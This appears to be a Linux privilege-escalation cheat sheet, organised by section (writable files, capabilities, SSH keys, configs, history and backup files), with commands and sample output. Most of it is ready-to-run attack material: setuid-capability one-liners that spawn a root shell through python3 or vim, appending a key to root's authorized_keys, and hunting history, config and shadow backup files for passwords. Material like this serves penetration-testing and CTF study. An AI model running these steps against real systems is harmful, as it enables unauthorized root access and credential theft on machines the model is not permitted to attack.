# FILE PERMISSIONS & CAPABILITIES

### World-writable files

Files anyone can modify — Config files, scripts, binaries

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

<details>
<summary>Example Output</summary>

```
find / -writable -type f 2>/dev/null
/etc/passwd         <- can add root user!
/opt/app/config.py  <- can inject code
/var/www/html/index.php <- can add webshell
```
</details>

---

### World-writable directories

Directories anyone can write to — Drop files for path hijack

```bash
find / -writable -type d 2>/dev/null
```

<details>
<summary>Example Output</summary>

```
find / -writable -type d 2>/dev/null
/tmp
/var/tmp
/opt/app/plugins/  <- can drop files here
/usr/local/bin/    <- PATH hijack possible
```
</details>

---

### Linux capabilities

Capabilities on binaries — cap_setuid = instant root

```bash
getcap -r / 2>/dev/null
```

<details>
<summary>Example Output</summary>

```
getcap -r / 2>/dev/null
/usr/bin/python3 = cap_setuid+ep  <- instant root!
/usr/bin/ping = cap_net_raw+ep    <- normal, ignore

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# whoami
root
```
</details>

---

### Capability abuse

GTFOBins for capabilities too — Capabilities are like mini-SUID

```bash
python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<details>
<summary>Example Output</summary>

```
getcap shows: /usr/bin/python3 = cap_setuid+ep

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# whoami
root

OR: /usr/bin/vim = cap_setuid+ep
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
```
</details>

---

### SSH keys

Private keys for other users — SSH as root or other user

```bash
find / -name 'id_rsa' -o -name 'authorized_keys' -o -name '*.pem' 2>/dev/null
ls -la /home/*/.ssh/
ls -la /root/.ssh/
```

<details>
<summary>Example Output</summary>

```
find / -name id_rsa 2>/dev/null
/home/admin/.ssh/id_rsa
/root/.ssh/id_rsa  <- root's key!
/opt/backups/.ssh/id_rsa

find / -name authorized_keys -writable 2>/dev/null
/root/.ssh/authorized_keys  <- WRITABLE!
echo 'your_pub_key' >> /root/.ssh/authorized_keys
ssh root@localhost
(Write your key = root SSH access)
```
</details>

---

### Readable config files

Database passwords, API keys — Password reuse is common

```bash
find / -name '*.conf' -readable 2>/dev/null
find / -name '*.config' -readable 2>/dev/null
find / -name 'wp-config*' 2>/dev/null
```

<details>
<summary>Example Output</summary>

```
find / -name '*.conf' -readable 2>/dev/null
/etc/apache2/sites-enabled/000-default.conf
/var/www/html/wp-config.php

cat wp-config.php:
define('DB_PASSWORD', 'WordPressDBp@ss!');
(Database credentials)
```
</details>

---

### History files

Previous commands — May contain typed passwords

```bash
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat ~/.mysql_history
```

<details>
<summary>Example Output</summary>

```
cat /home/admin/.bash_history
mysql -u root -p'S3cretDBP@ss'
ssh root@10.10.10.20
sudo su - backup_user
(Passwords typed in commands)
```
</details>

---

### Backup files

Backup files with old configs — Old passwords, keys

```bash
find / -name '*.bak' -o -name '*.old' -o -name '*.backup' -o -name '*.zip' -o -name '*.tar.gz' 2>/dev/null
```

<details>
<summary>Example Output</summary>

```
find / -name '*.bak' -o -name '*.old' 2>/dev/null
/var/backups/shadow.bak  <- old shadow file!
/opt/config.old  <- old config with passwords

cat /var/backups/shadow.bak
root:$6$oldhash...
```
</details>

---

### /opt and /srv

Custom installed applications — Often misconfigured

```bash
ls -la /opt/
ls -la /srv/
```

<details>
<summary>Example Output</summary>

```
ls -la /opt/
drwxrwxrwx  admin app_v2/  <- writable custom app!
-rwsr-xr-x  root  monitor  <- SUID custom binary!

ls -la /srv/
drwxr-xr-x  root  web/  <- alternative web root
```
</details>

---
